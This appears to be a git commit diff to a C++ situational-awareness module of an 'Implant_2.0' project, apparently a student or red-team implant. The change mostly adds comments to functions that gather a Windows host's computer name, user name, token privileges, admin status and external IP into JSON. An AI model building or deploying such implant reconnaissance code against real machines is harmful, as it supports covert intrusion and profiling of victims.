fb739f37f6f287910cdc8790ac74b2f93c44abda
FeiyuWang <36805094+FeiyuWang@users.noreply.github.com>
2022-12-18 18:50:09 -0500

    Update GatherInfo.cpp

--- Implant_2.0/situational_awareness/GatherInfo.cpp
+++ Implant_2.0/situational_awareness/GatherInfo.cpp
@@ -27,31 +27,38 @@ string getUserName() {
 }
 
 //https://stackoverflow.com/questions/56043589/how-to-recover-privileges-with-gettokeninformation-c
+//This function checks if the current user has a specific privilege
 BOOL CheckWindowsPrivilege(const TCHAR* Privilege)
 {
     LUID luid;
     PRIVILEGE_SET privs;
     HANDLE hProcess;
     HANDLE hToken;
+    // Get the current process token handle so we can get the privilege.
     hProcess = GetCurrentProcess();
+    // Get a token for this process.
     if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) return FALSE;
+    // Get the LUID for the privilege.
     if (!LookupPrivilegeValue(NULL, Privilege, &luid)) return FALSE;
     privs.PrivilegeCount = 1;
     privs.Control = PRIVILEGE_SET_ALL_NECESSARY;
     privs.Privilege[0].Luid = luid;
     privs.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;
     BOOL bResult;
+    // Check to see if the token has the privilege.
     PrivilegeCheck(hToken, &privs, &bResult);
     return bResult;
 }
 
 
 //https://learn.microsoft.com/zh-cn/windows/win32/api/securitybaseapi/nf-securitybaseapi-checktokenmembership?redirectedfrom=MSDN
+//This function checks if the current user is an admin
 BOOL IsUserAdmin()
 {
     BOOL b;
     SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
     PSID AdministratorsGroup;
+    // Initialize SID.
     b = AllocateAndInitializeSid(
         &NtAuthority,
         2,
@@ -61,6 +68,7 @@ BOOL IsUserAdmin()
         &AdministratorsGroup);
     if (b)
     {
+        // Check whether the token is present in admin group.
         if (!CheckTokenMembership(NULL, AdministratorsGroup, &b))
         {
             b = FALSE;
@@ -118,7 +126,6 @@ std::string checkPrivileges() {
     return result;
 }
 
-/* Gets IP by making a Get Request to MyExternalIp.com */
 std::string real_ip() {
 	std::string output;
 	DWORD dwSize = 0;
@@ -171,11 +178,36 @@ json GetAll(){
     const string compName = getComputerName();
     const string userName = getUserName();
     const string ipName = real_ip();
+    //vector<string>ipName = getIP();
+    //cout << compName << endl;
+    //cout << userName << endl;
+    //cout << ipName << endl;
+    //cout << IsUserAnAdmin() << endl;
+    //vector<pair<string, bool>> p( checkPrivileges());
     const string p = checkPrivileges();
+    /*
+    for(pair<string, bool> p : checkPrivileges()) {
+        cout << p.first << ": " << p.second << endl;
+    }
+    */
     res["compName"] = compName;
     res["userName"] = userName;
     res["Privileges"] = p;
-    res["ipName"] = ipName;
+   res["ipName"] = ipName;
     return res;
 
 }
+
+
+
+/*
+
+
+NEED TO ADD IN MORE FUNCTIONS HERE
+
+
+*/
+//   int main() {
+//         GetAll();
+//   }
+
